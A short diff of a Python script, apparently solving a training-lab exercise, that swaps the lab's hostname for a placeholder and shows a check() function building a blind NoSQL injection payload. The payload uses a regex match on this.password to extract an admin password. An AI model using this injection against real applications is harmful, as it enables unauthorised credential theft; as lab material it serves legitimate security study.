@@ -3,7 +3,7 @@
 import urllib.request
 import string
 
-URL = "http://ptl-5643a299-a40cac12.libcurl.so"
+URL = "<URL>"
 
 def check(payload):
     url=URL+"/?search=admin%27%26%26%20this.password%20%26%26%20this.password.match(/"+payload+"/)%00"
